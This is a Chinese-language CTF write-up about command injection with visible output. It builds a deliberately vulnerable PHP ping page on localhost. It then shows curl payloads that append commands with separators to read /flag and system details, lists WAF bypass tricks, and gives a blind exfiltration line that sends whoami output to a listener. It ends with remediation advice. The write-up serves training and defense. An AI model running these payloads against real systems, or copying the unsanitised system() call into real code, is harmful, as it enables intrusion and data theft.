---
title: "命令注入（有回显）"
slug: "ctf-command-injection-echo"
date: 2026-08-30T21:31:51+08:00
lastmod: 2026-10-27T11:30:00+08:00
draft: false
author: ["xuanwo"]
description: "有回显的命令注入题：探测分隔符、读取文件、定位 flag。"
summary: "有回显的命令注入题：探测分隔符、读取文件、定位 flag。"
tags: ["CTF", "命令注入", "RCE"]
categories: ["CTF Writeup"]
series: ["CTF Writeup"]
weight: 7
ShowToc: true
TocOpen: false
hidemeta: false
comments: false
showReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowCodeCopyButtons: true
source_repo: "https://github.com/xuanwoLQL/security-notes/blob/main/ctf-writeups/7.命令注入题型有回显.md"
---

## 复现流程图

<figure class="note-diagram">
  <img src="/images/notes/ctf-command-injection-echo/workflow.svg" alt="URL 参数进入 shell 后，用分隔符追加命令并读取回显。" loading="lazy">
  <figcaption>图 1 · 有回显命令注入。URL 参数进入 shell 后，用分隔符追加命令并读取回显。</figcaption>
</figure>

## 1. 本地可运行环境

创建 `/tmp/cmdi/index.php`：

```php
<?php
$url = $_GET['url'] ?? '';
if ($url !== '') {
    system('ping -c 1 ' . $url);
}
```

启动：

```bash
cd /tmp/cmdi
php -S 127.0.0.1:8080
```

## 2. 建立正常基线

```bash
curl -sS --get --data-urlencode 'url=127.0.0.1' \
  'http://127.0.0.1:8080/'
```

Windows 环境可以把命令改为 `ping -n 1`，或直接在 Linux 容器里执行。

## 3. 验证命令执行

```bash
curl -sS --get --data-urlencode 'url=127.0.0.1; whoami' \
  'http://127.0.0.1:8080/'
```

预期响应同时包含 `ping` 结果和 `whoami` 结果。

## 4. 最小取证命令

```bash
curl -sS --get --data-urlencode 'url=127.0.0.1; pwd; id; uname -a' \
  'http://127.0.0.1:8080/'
```

查看目录：

```bash
curl -sS --get --data-urlencode 'url=127.0.0.1; ls -la /' \
  'http://127.0.0.1:8080/'
```

读取 flag：

```bash
curl -sS --get --data-urlencode 'url=127.0.0.1; cat /flag' \
  'http://127.0.0.1:8080/'
```

## 5. 原题常见变体

| 变体 | 测试 payload | 观察点 |
| --- | --- | --- |
| `;` | `127.0.0.1;whoami` | 两条命令都执行 |
| `&&` | `127.0.0.1&&whoami` | 前一条成功才执行 |
| `||` | `127.0.0.1||whoami` | 前一条失败才执行 |
| `|` | `127.0.0.1|whoami` | 管道后执行 |
| `$()` | `$(whoami)` | 命令替换 |
| 反引号 | `` `whoami` `` | 命令替换 |

## 6. 无回显时

如果响应没有命令结果，先不要直接上反弹 Shell。用授权监听端做最小外带：

```bash
# 在授权监听机
python3 -m http.server 8000
```

```bash
curl -sS --get --data-urlencode \
  'url=127.0.0.1; curl http://127.0.0.1:8000/$(whoami)' \
  'http://127.0.0.1:8080/'
```

只有在靶场允许且目标可达时才使用反弹 Shell，并优先使用最小、可清理的命令。

## 7. 排错

- `ping` 本身不存在：改用 `id` 或 `echo marker`；
- 输出被 HTML 包裹：把响应保存为文件再 `grep`；
- 分隔符被 WAF 过滤：测 `%0a`、`&&`、URL 编码和 Base64 包装；
- 目标没有 `/bin/sh`：先确认可用 shell，再选择命令。

## 8. 修复建议

- 不拼接 shell 字符串；
- 使用参数数组调用；
- URL 域名做严格白名单；
- 禁止 `system`、`exec`、`shell_exec`；
- 低权限运行并限制出网。
